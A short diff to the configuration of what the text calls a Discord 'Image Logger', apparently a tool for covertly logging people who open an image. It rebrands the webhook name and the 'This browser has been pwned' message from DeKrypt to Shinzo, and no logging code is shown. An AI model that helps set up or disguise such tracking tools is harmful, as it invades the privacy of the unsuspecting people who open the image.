@@ -18,7 +18,7 @@ config = {
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Shinzo", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by Shinzo's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
